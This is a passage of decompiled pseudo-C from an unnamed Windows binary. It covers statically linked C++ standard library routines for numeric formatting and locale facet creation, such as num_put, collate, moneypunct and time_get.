  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 441CF1: using guessed type char var_18[20];

//----- (00441E32) --------------------------------------------------------
int __thiscall sub_441E32(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 76, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 441E32: using guessed type char var_18[20];

//----- (0044203C) --------------------------------------------------------
int __thiscall sub_44203C(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  const char *v9; // eax
  int v10; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v13[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v9 = (const char *)unknown_libname_19(this, v13, "Lu", *(_DWORD *)(a5 + 20));
  v10 = sprintf_s(Buffer, 0x40u, v9, a7, a8);
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput((int)this, a2, a3, a4, a5, a6, (int)Buffer, v10);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 44203C: using guessed type char var_C[8];

//----- (004422C9) --------------------------------------------------------
int __thiscall sub_4422C9(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  const char *v8; // eax
  int v9; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v12[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v8 = (const char *)unknown_libname_19(this, v12, "lu", *(_DWORD *)(a5 + 20));
  v9 = sprintf_s(Buffer, 0x40u, v8, a7);
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(this, a2, a3, a4, a5, a6, Buffer, v9);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 43CABA: using guessed type _DWORD __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4422C9: using guessed type char var_C[8];

//----- (00442334) --------------------------------------------------------
int __thiscall sub_442334(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 0, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 442334: using guessed type char var_18[20];

//----- (00442475) --------------------------------------------------------
int __thiscall sub_442475(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X)
{
  int v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ebx
  const char *v11; // eax
  char *v12; // ecx
  int v13; // eax
  char *v14; // ecx
  char *v15; // ecx
  int Y; // [esp+20h] [ebp-38h] BYREF
  unsigned int v18; // [esp+24h] [ebp-34h] BYREF
  char Buffer[4]; // [esp+28h] [ebp-30h] BYREF
  size_t BufferCount; // [esp+38h] [ebp-20h]
  unsigned int v21; // [esp+3Ch] [ebp-1Ch]
  char v22[20]; // [esp+40h] [ebp-18h] BYREF
  int v23; // [esp+54h] [ebp-4h]

  v18 = (unsigned int)this;
  BufferCount = 0;
  v21 = 15;
  Buffer[0] = 0;
  v7 = a5[6];
  v8 = a5[5] & 0x3000;
  v23 = 0;
  if ( __SPAIR64__(a5[7], v7) > 0 || v8 == 0x2000 )
  {
    v9 = v7;
    if ( v8 == 0x2000 && fabs(X) > 1.0e10 )
    {
      frexp(X, &Y);
      v9 = (int)(30103 * abs32(Y)) / 100000 + v7;
    }
  }
  else
  {
    v7 = 6;
    v9 = 6;
  }
  sub_40E9F0(Buffer, v9 + 50, 0);
  v10 = v18;
  v11 = (const char *)unknown_libname_18(v18, v22, 76, a5[5]);
  v12 = Buffer;
  if ( v21 >= 0x10 )
    v12 = *(char **)Buffer;
  v13 = sprintf_s(v12, BufferCount, v11, v7, X);
  v14 = Buffer;
  if ( v21 >= 0x10 )
    v14 = *(char **)Buffer;
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(v10, a2, a3, a4, (int)a5, a6, v14, v13);
  if ( v21 >= 0x10 )
  {
    v15 = *(char **)Buffer;
    v18 = v21 + 1;
    Y = *(_DWORD *)Buffer;
    if ( v21 + 1 >= 0x1000 )
    {
      std::_Adjust_manually_vector_aligned((void **)&Y, &v18);
      v15 = (char *)Y;
    }
    sub_44775B(v15);
  }
  return a2;
}
// 430BD1: using guessed type _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD);
// 442475: using guessed type char var_18[20];

//----- (004425B6) --------------------------------------------------------
int __thiscall sub_4425B6(void *this, int a2, int a3, int a4, int a5, int a6, const void *a7)
{
  int v8; // eax
  char Buffer[64]; // [esp+Ch] [ebp-44h] BYREF

  v8 = sprintf_s(Buffer, 0x40u, "%p", a7);
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(this, a2, a3, a4, a5, a6, Buffer, v8);
  return a2;
}
// 43CABA: using guessed type _DWORD __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0044267F) --------------------------------------------------------
int __thiscall sub_44267F(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  const char *v9; // eax
  int v10; // eax
  char Buffer[64]; // [esp+Ch] [ebp-4Ch] BYREF
  char v13[8]; // [esp+4Ch] [ebp-Ch] BYREF

  v9 = (const char *)unknown_libname_19(this, v13, "Lu", *(_DWORD *)(a5 + 20));
  v10 = sprintf_s(Buffer, 0x40u, v9, a7, a8);
  std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(this, a2, a3, a4, a5, a6, Buffer, v10);
  return a2;
}
// 43232C: using guessed type _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD);
// 43CABA: using guessed type _DWORD __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44267F: using guessed type char var_C[8];

//----- (00442A25) --------------------------------------------------------
__int16 __thiscall sub_442A25(_WORD *this)
{
  return this[7];
}

//----- (00442C4E) --------------------------------------------------------
int __stdcall sub_442C4E(char a1)
{
  return std::ctype<unsigned short>::_Dowiden(a1);
}
// 436FCD: using guessed type _DWORD __stdcall std::ctype<unsigned short>::_Dowiden(char);

//----- (00443274) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_443274(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBD0;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBD0;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBB0);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_443823((_Collvec **)&v6, (int)a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBD0 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBD0: using guessed type int dword_4FFBD0;
// 443274: using guessed type char var_14[4];

//----- (00443309) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_443309(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBD4;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBD4;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBB4);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4438C5(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBD4 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBD4: using guessed type int dword_4FFBD4;
// 443309: using guessed type char var_14[4];

//----- (0044339E) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_44339E(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBD8;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBD8;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBB8);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_44392D(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBD8 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBD8: using guessed type int dword_4FFBD8;
// 44339E: using guessed type char var_14[4];

//----- (00443433) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_443433(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBDC;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBDC;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBBC);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_443995(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBDC = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBDC: using guessed type int dword_4FFBDC;
// 443433: using guessed type char var_14[4];

//----- (004434C8) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4434C8(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBE4;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBE4;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBC4);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4439FD(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBE4 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBE4: using guessed type int dword_4FFBE4;
// 4434C8: using guessed type char var_14[4];

//----- (0044355D) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_44355D(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBE0;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBE0;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBC0);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_443A81(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBE0 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBE0: using guessed type int dword_4FFBE0;
// 44355D: using guessed type char var_14[4];

//----- (004435F2) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4435F2(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBE8;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBE8;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBC8);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_443B06(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBE8 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBE8: using guessed type int dword_4FFBE8;
// 4435F2: using guessed type char var_14[4];

//----- (00443687) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_443687(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_4FFBEC;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_4FFBEC;
  v2 = std::locale::id::operator unsigned int(&unk_4FFBCC);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_443B72(&v6, a1) == -1 )
        sub_432C2C();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_4FFBEC = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 432C2C: using guessed type void __noreturn sub_432C2C(void);
// 4FFBEC: using guessed type int dword_4FFBEC;
// 443687: using guessed type char var_14[4];

//----- (0044371C) --------------------------------------------------------
_DWORD *__thiscall sub_44371C(_DWORD *this, std::_Locinfo *a2, int a3)
{
  this[1] = a3;
  *this = &std::time_get<char,std::istreambuf_iterator<char>>::`vftable';
  std::time_get<char,std::istreambuf_iterator<char>>::_Init(a2);
  return this;
}
// 491618: using guessed type void *std::time_get<char,std::istreambuf_iterator<char>>::`vftable';

//----- (0044374F) --------------------------------------------------------
void __thiscall sub_44374F(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[3];
  *this = &std::collate<char>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491514: using guessed type void *std::collate<char>::`vftable';

//----- (00443769) --------------------------------------------------------
void __thiscall sub_443769(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[2];
  *this = &std::time_put<char,std::ostreambuf_iterator<char>>::`vftable';
  free(v2);
  *this = &std::_Facet_base::`vftable';
}
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491644: using guessed type void *std::time_put<char,std::ostreambuf_iterator<char>>::`vftable';

//----- (004437B1) --------------------------------------------------------
_DWORD *__thiscall sub_4437B1(_DWORD *Block, char a2)
{
  sub_44374F(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (004437D3) --------------------------------------------------------
_DWORD *__thiscall sub_4437D3(_DWORD *Block, char a2)
{
  *Block = &std::time_get<char,std::istreambuf_iterator<char>>::`vftable';
  unknown_libname_61();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 43E637: using guessed type int unknown_libname_61(void);
// 4906B0: using guessed type void *std::_Facet_base::`vftable';
// 491618: using guessed type void *std::time_get<char,std::istreambuf_iterator<char>>::`vftable';

//----- (00443801) --------------------------------------------------------
_DWORD *__thiscall sub_443801(_DWORD *Block, char a2)
{
  sub_443769(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00443823) --------------------------------------------------------
int __cdecl sub_443823(_Collvec **a1, int a2)
{
  char v2; // bl
  _Collvec *v3; // esi
  const char *v4; // eax
  bool v5; // cf
  void *v7[14]; // [esp+10h] [ebp-68h] BYREF
  int v8; // [esp+48h] [ebp-30h]
  int v9; // [esp+4Ch] [ebp-2Ch]
  _DWORD v10[9]; // [esp+50h] [ebp-28h] BYREF
  int v11; // [esp+74h] [ebp-4h]

  v2 = 0;
  v9 = a2;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = (_Collvec *)operator new(0x10u);
    v7[13] = v3;
    v11 = 0;
    if ( v3 )
    {
      v4 = (const char *)std::locale::name(v10);
      v5 = *((_DWORD *)v4 + 5) < 0x10u;
      LOBYTE(v11) = 1;
      v8 = 1;
      if ( !v5 )
        v4 = *(const char **)v4;
      std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3->_LocaleName = 0;
      v2 = 3;
      v3->_Page = (unsigned int)&std::collate<char>::`vftable';
      v3[1] = _Getcoll();
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 2) != 0 )
    {
      v2 &= ~2u;
      sub_42DB80(v7);
    }
    if ( (v2 & 1) != 0 )
      sub_409CE0(v10);
  }
  return 1;
}
// 442ED2: using guessed type _DWORD __stdcall std::locale::name(_DWORD);
// 491514: using guessed type void *std::collate<char>::`vftable';
// 443823: using guessed type _DWORD var_28[9];

//----- (004438C5) --------------------------------------------------------
int __cdecl sub_4438C5(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::messages<char>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 6;
}
// 491530: using guessed type void *std::messages<char>::`vftable';

//----- (0044392D) --------------------------------------------------------
int __cdecl sub_44392D(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_get<char,std::istreambuf_iterator<char>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 49154C: using guessed type void *std::money_get<char,std::istreambuf_iterator<char>>::`vftable';

//----- (00443995) --------------------------------------------------------
int __cdecl sub_443995(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  void *v6[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v7; // [esp+44h] [ebp-10h]
  int v8; // [esp+50h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(8u);
    v7 = v3;
    v8 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      std::_Locinfo::_Locinfo((std::_Locinfo *)v6, v4);
      v2 = 1;
      *v3 = &std::money_put<char,std::ostreambuf_iterator<char>>::`vftable';
      v3[1] = 0;
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v6);
  }
  return 3;
}
// 491564: using guessed type void *std::money_put<char,std::ostreambuf_iterator<char>>::`vftable';

//----- (004439FD) --------------------------------------------------------
int __cdecl sub_4439FD(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<char>::`vftable';
      *((_BYTE *)v3 + 40) = 1;
      std::_Mpunct<char>::_Init(v5, 1);
      *v3 = &std::moneypunct<char,1>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 4449BD: using guessed type _DWORD __stdcall std::_Mpunct<char>::_Init(_DWORD, char);
// 49157C: using guessed type void *std::_Mpunct<char>::`vftable';
// 4915E4: using guessed type void *std::moneypunct<char,1>::`vftable';

//----- (00443A81) --------------------------------------------------------
int __cdecl sub_443A81(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[14]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+48h] [ebp-10h]
  int v9; // [esp+54h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0x58u);
    v7[13] = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      v2 = 1;
      v8 = 1;
      v9 = 2;
      *v3 = &std::_Mpunct<char>::`vftable';
      *((_BYTE *)v3 + 40) = 0;
      std::_Mpunct<char>::_Init(v5, 1);
      *v3 = &std::moneypunct<char,0>::`vftable';
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 3;
}
// 4449BD: using guessed type _DWORD __stdcall std::_Mpunct<char>::_Init(_DWORD, char);
// 49157C: using guessed type void *std::_Mpunct<char>::`vftable';
